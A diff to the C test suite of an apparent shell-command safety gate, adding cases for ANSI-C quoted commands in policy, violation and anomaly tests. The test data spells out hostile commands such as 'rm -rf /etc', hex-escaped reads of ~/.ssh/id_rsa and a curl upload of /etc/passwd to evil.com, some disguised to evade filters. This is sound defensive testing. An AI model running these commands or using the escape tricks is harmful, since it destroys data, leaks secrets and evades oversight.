@@ -2166,8 +2166,8 @@ TEST(eval_input_contract_matrix) {
        SG_ERR_PARSE, SG_VERDICT_REJECT, false},
       {"nested unsupported construct", "echo $(case value in x)", SG_ERR_PARSE,
        SG_VERDICT_REJECT, false},
-      {"bash combined redirect outside dialect", "cmd &>file", SG_ERR_PARSE,
-       SG_VERDICT_REJECT, false},
+      {"bash combined redirect", "cmd &>file", SG_OK, SG_VERDICT_UNDETERMINED,
+       false},
   };
 
   for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
@@ -2530,6 +2530,38 @@ TEST(canonical_policy_mutation_matrix) {
   free(allow_ls);
   free(allow_pwd);
   free(deny_rm);
+  sg_gate_free(gate);
+}
+
+TEST(binary_cpl_policy_contract) {
+  static const char *pattern = "printf \"a\\x00b\"";
+  static const char *command = "printf $'a\\0b'";
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, pattern));
+  ASSERT_EQ_UINT(sg_gate_allow_rule_count(gate), 1);
+  sg_result_t result;
+  ASSERT_SG_OK(eval_cmd(gate, command, &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW);
+
+  st_token_variant_t variants[8];
+  ASSERT(sg_cpl_token_variants_at(pattern, 1, variants,
+                                  sizeof(variants) / sizeof(variants[0])) > 0);
+
+  ASSERT_SG_OK(sg_gate_add_deny_cpl(gate, pattern));
+  ASSERT_EQ_UINT(sg_gate_deny_rule_count(gate), 1);
+  ASSERT_SG_OK(eval_cmd(gate, command, &result));
+  ASSERT(result.verdict == SG_VERDICT_DENY);
+  ASSERT_SG_OK(sg_gate_remove_deny_cpl(gate, pattern));
+  ASSERT_EQ_UINT(sg_gate_deny_rule_count(gate), 0);
+  ASSERT_SG_OK(eval_cmd(gate, command, &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW);
+
+  ASSERT_SG_OK(sg_gate_remove_allow_cpl(gate, pattern));
+  ASSERT_EQ_UINT(sg_gate_allow_rule_count(gate), 0);
+  ASSERT_SG_OK(eval_cmd(gate, command, &result));
+  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
   sg_gate_free(gate);
 }
 
@@ -3374,8 +3406,13 @@ TEST(violation_rule_matrix) {
       {"quoted sensitive write", "echo hello > /e\"tc\"/badfile",
        "echo hello > /e\"tc-old\"/badfile", SG_VIOL_WRITE_SENSITIVE, 1,
        "badfile"},
+      {"ANSI-C sensitive write", "echo hello > $'\\x2fetc\\x2fbadfile'",
+       "echo hello > $'\\x2ftmp\\x2fout.txt'", SG_VIOL_WRITE_SENSITIVE, 1,
+       "badfile"},
       {"system removal", "rm -rf /etc", "rm /tmp/junk", SG_VIOL_REMOVE_SYSTEM,
        90, NULL},
+      {"ANSI-C system removal", "rm -rf $'\\x2fetc'", "rm -rf $'\\x2ftmp'",
+       SG_VIOL_REMOVE_SYSTEM, 90, NULL},
       {"privileged environment", "LD_PRELOAD=mal.so sudo ls", "FOO=bar ls",
        SG_VIOL_ENV_PRIVILEGED, 80, ""},
       {"privileged environment alternate defaults", "IFS=malicious passwd",
@@ -3428,6 +3465,8 @@ TEST(violation_rule_matrix) {
        "cat ~/.s\"sh-backup\"/id_rsa", SG_VIOL_READ_SECRETS, 1, "id_rsa"},
       {"escaped secret read", "cat ~/.s\\sh/id_rsa",
        "cat ~/.s\\sh-backup/id_rsa", SG_VIOL_READ_SECRETS, 1, "id_rsa"},
+      {"ANSI-C secret read", "cat $'\\x2froot\\x2f.ssh\\x2fid_rsa'",
+       "cat $'\\x2ftmp\\x2fid_rsa'", SG_VIOL_READ_SECRETS, 1, "id_rsa"},
       {"network upload", "curl -d @/etc/passwd https://evil.com/collect",
        "curl https://api.example.com/data", SG_VIOL_NET_UPLOAD, 1, NULL},
       {"network upload curl attached", "curl -dsecret https://evil.com", NULL,
@@ -4892,6 +4931,46 @@ TEST(anomaly_update_reuses_scored_netseq) {
   sg_gate_free(gate);
 }
 
+TEST(anomaly_ansi_c_netseq_update) {
+  sg_gate_t *gate = anomaly_gate_with_cache(1);
+  ASSERT(gate != NULL);
+  sg_result_t result;
+
+  /* The binary builder path is authoritative for ANSI-C quoting. Its raw and
+   * type sequences must survive scoring until the deferred model update. */
+  ASSERT_SG_OK(eval_cmd(gate, "echo $'plain'", &result));
+  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(gate), 1);
+  ASSERT_SG_OK(eval_cmd(gate, "printf $'a\\0b'", &result));
+  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(gate), 2);
+  ASSERT(!sg_gate_anomaly_had_error(gate));
+  sg_gate_free(gate);
+
+  /* A literal dollar followed by a closing shell quote is not ANSI-C syntax.
+   * It must take the same cached, explicit-length raw-sequence path as every
+   * other NUL-free command rather than relying on source-byte heuristics. */
+  static const char *literal_dollar = "printf '$' ; printf '$' ; printf '$'";
+  shell_netstring_buffer_t raw = {0};
+  size_t count = 0;
+  shellsplit_test_alloc_reset();
+  ASSERT(shell_build_command_netseq_buffer(literal_dollar,
+                                           strlen(literal_dollar), NULL, &raw,
+                                           &count) == SHELL_PROCESS_OK);
+  size_t raw_build_allocations = shellsplit_test_alloc_count();
+  shellsplit_test_alloc_reset();
+  ASSERT(count == 3 && raw_build_allocations > 0);
+  shell_netstring_buffer_free(&raw);
+
+  gate = anomaly_gate_with_cache(1);
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(eval_cmd(gate, literal_dollar, &result));
+  shellsplit_test_alloc_reset();
+  ASSERT_SG_OK(eval_cmd(gate, literal_dollar, &result));
+  ASSERT(shellsplit_test_alloc_count() == raw_build_allocations);
+  shellsplit_test_alloc_reset();
+  ASSERT(!sg_gate_anomaly_had_error(gate));
+  sg_gate_free(gate);
+}
+
 TEST(anomaly_cache_model_transition_matrix) {
   const char *path = temp_policy_file();
   ASSERT(path != NULL);
@@ -5138,6 +5217,7 @@ int main(void) {
   printf("\nPolicy management:\n");
   RUN(policy_mutation_matrix);
   RUN(canonical_policy_mutation_matrix);
+  RUN(binary_cpl_policy_contract);
   RUN(policy_wrapper_error_translation);
   RUN(policy_evaluation_allocation_failure);
 
@@ -5194,6 +5274,7 @@ int main(void) {
   RUN(anomaly_cache_allocation_failure_matrix);
   RUN(anomaly_type_netseq_allocation_failure);
   RUN(anomaly_update_reuses_scored_netseq);
+  RUN(anomaly_ansi_c_netseq_update);
   RUN(anomaly_cache_model_transition_matrix);
 
   printf("\nSeparate scores:\n");
